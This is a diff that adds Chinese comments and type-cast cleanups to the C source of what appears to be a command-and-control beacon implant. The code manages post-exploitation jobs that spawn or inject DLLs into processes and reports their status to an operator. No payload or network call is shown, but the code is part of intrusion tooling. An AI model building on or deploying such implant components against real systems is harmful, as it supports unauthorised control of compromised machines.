@@ -1,5 +1,6 @@
 #include "postex_internal.h"
 
+/* 返回 PostEx 子命令的可读名称。 */
 const CHAR* PostExSubcmdName(UINT32 subcmd)
 {
     switch (subcmd) {
@@ -9,6 +10,7 @@ const CHAR* PostExSubcmdName(UINT32 subcmd)
     }
 }
 
+/* 返回 PostEx 取消原因的可读名称。 */
 const CHAR* PostExCancelReasonName(UINT32 reason)
 {
     switch (reason) {
@@ -19,12 +21,14 @@ const CHAR* PostExCancelReasonName(UINT32 reason)
     }
 }
 
+/* 检查 PostEx 关联进程是否已经退出。 */
 BOOL PostExProcessExited(PostExJob* job)
 {
     return job && job->process &&
            WaitForSingleObject(job->process, 0) == WAIT_OBJECT_0;
 }
 
+/* 关闭 PostEx job 的 pipe/backend 资源并释放对象。 */
 VOID PostExCloseJob(PostExJob* job, BOOL kill_process)
 {
     if (!job) return;
@@ -37,6 +41,7 @@ VOID PostExCloseJob(PostExJob* job, BOOL kill_process)
     HeapFree(GetProcessHeap(), 0, job);
 }
 
+/* 在已持有 manager lock 的前提下查找 job。 */
 PostExJob* PostExFindLocked(PostExManager* pm, UINT32 job_id)
 {
     PostExJob* cur;
@@ -47,6 +52,7 @@ PostExJob* PostExFindLocked(PostExManager* pm, UINT32 job_id)
     return NULL;
 }
 
+/* 在已持有 manager lock 的前提下摘除 job。 */
 PostExJob* PostExDetachLocked(PostExManager* pm, UINT32 job_id)
 {
     PostExJob** pp;
@@ -64,6 +70,7 @@ PostExJob* PostExDetachLocked(PostExManager* pm, UINT32 job_id)
     return NULL;
 }
 
+/* 在已持有 manager lock 的前提下统计 job 数量。 */
 SIZE_T PostExJobCountLocked(PostExManager* pm)
 {
     SIZE_T count = 0;
@@ -75,6 +82,7 @@ SIZE_T PostExJobCountLocked(PostExManager* pm)
     return count;
 }
 
+/* 在已持有 manager lock 的前提下标记取消并通知后端。 */
 BOOL PostExRequestCancelLocked(PostExJob* job, UINT32 reason,
                                ULONGLONG now, BOOL* signaled)
 {
@@ -96,12 +104,14 @@ BOOL PostExRequestCancelLocked(PostExJob* job, UINT32 reason,
     return newly_requested;
 }
 
+/* 更新 job 最近活动时间。 */
 VOID PostExTouchJobActivityLocked(PostExJob* job, ULONGLONG now)
 {
     if (!job) return;
     job->last_activity_tick = now ? now : GetTickCount64();
 }
 
+/* 检查是否允许启动新的 PostEx job。 */
 BOOL PostExCanStartJob(struct BeaconContext* ctx, UINT32 task_id,
                        CHAR* err, SIZE_T err_size)
 {
@@ -119,7 +129,7 @@ BOOL PostExCanStartJob(struct BeaconContext* ctx, UINT32 task_id,
         if (err && err_size) {
             _snprintf_s(err, err_size, _TRUNCATE,
                         "postex job limit reached (%lu)",
-                        (unsigned long)POSTEX_MAX_JOBS);
+                        (ULONG)POSTEX_MAX_JOBS);
         }
         ok = FALSE;
     }
@@ -128,6 +138,7 @@ BOOL PostExCanStartJob(struct BeaconContext* ctx, UINT32 task_id,
     return ok;
 }
 
+/* 启动失败或注册失败时清理刚创建的后端资源。 */
 VOID PostExCloseStartedBackend(const PostExStartRequest* req,
                                HANDLE pipe,
                                PostExStartResult* result)
@@ -138,6 +149,7 @@ VOID PostExCloseStartedBackend(const PostExStartRequest* req,
     PostExBackendCleanupStartResult(req, result);
 }
 
+/* 将已启动的 PostEx 后端注册为可轮询 job。 */
 ByteBuf PostExRegisterStartedJob(struct BeaconContext* ctx,
                                  const PostExStartRequest* req,
                                  HANDLE pipe,
@@ -149,6 +161,7 @@ ByteBuf PostExRegisterStartedJob(struct BeaconContext* ctx,
 
     if (!ctx || !req || !result) return BbFromText("invalid postex job");
 
+    /* result 的句柄所有权转移到 PostExJob。 */
     job = (PostExJob*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*job));
     if (!job) {
         PostExCloseStartedBackend(req, pipe, result);
@@ -177,6 +190,7 @@ ByteBuf PostExRegisterStartedJob(struct BeaconContext* ctx,
              req->description[0] ? req->description : default_description);
     PostExStartResultInit(result);
 
+    /* 注册前再检查一次，避免并发任务复用相同 task id。 */
     EnterCriticalSection(&ctx->postex.lock);
     if (PostExFindLocked(&ctx->postex, req->task_id)) {
         LeaveCriticalSection(&ctx->postex.lock);
@@ -195,18 +209,19 @@ ByteBuf PostExRegisterStartedJob(struct BeaconContext* ctx,
     BbInit(&out);
     if (req->subcmd == POSTEX_SUBCMD_SPAWN_DLL) {
         BbPrintf(&out, "postex spawn job %lu started: %s pid:%lu",
-                 (unsigned long)req->task_id,
+                 (ULONG)req->task_id,
                  job->description,
-                 (unsigned long)job->pid);
+                 (ULONG)job->pid);
     } else {
         BbPrintf(&out, "postex inject job %lu started: %s pid:%lu",
-                 (unsigned long)req->task_id,
+                 (ULONG)req->task_id,
                  job->description,
-                 (unsigned long)job->pid);
+                 (ULONG)job->pid);
     }
     return out;
 }
 
+/* 请求取消指定 PostEx job，并返回面向 operator 的状态文本。 */
 BOOL PostExCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
 {
     PostExJob* job;
@@ -230,7 +245,7 @@ BOOL PostExCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
     if (!job) return FALSE;
 
     BbPrintf(out, "postex job %lu (%s) %s%s: %s",
-             (unsigned long)job_id,
+             (ULONG)job_id,
              PostExSubcmdName(subcmd),
              newly_requested ? "cancel requested" : "cancel already requested",
              signaled ? "" : " (signal pending)",
@@ -238,6 +253,7 @@ BOOL PostExCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
     return TRUE;
 }
 
+/* 将 PostEx job 追加到 jobs 命令输出表。 */
 VOID PostExAppendJobs(PostExManager* pm, ByteBuf* out, SIZE_T* count, ULONGLONG now)
 {
     PostExJob* cur;
@@ -252,7 +268,7 @@ VOID PostExAppendJobs(PostExManager* pm, ByteBuf* out, SIZE_T* count, ULONGLONG 
 
         if (cur->pid) {
             _snprintf_s(ref, sizeof(ref), _TRUNCATE,
-                        "pid:%lu", (unsigned long)cur->pid);
+                        "pid:%lu", (ULONG)cur->pid);
         } else {
             strcpy_s(ref, sizeof(ref), "pipe");
         }
@@ -261,11 +277,11 @@ VOID PostExAppendJobs(PostExManager* pm, ByteBuf* out, SIZE_T* count, ULONGLONG 
                     cur->description[0] ? cur->description : "-");
 
         BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
-                 (unsigned long)cur->job_id,
+                 (ULONG)cur->job_id,
                  "postex",
                  cur->cancel_requested ? "cancelling" : "running",
                  (unsigned __int64)age,
-                 (unsigned long)BEACON_COMMAND_POSTEX_EVENT,
+                 (ULONG)BEACON_COMMAND_POSTEX_EVENT,
                  PostExSubcmdName(cur->subcmd),
                  ref,
                  detail);
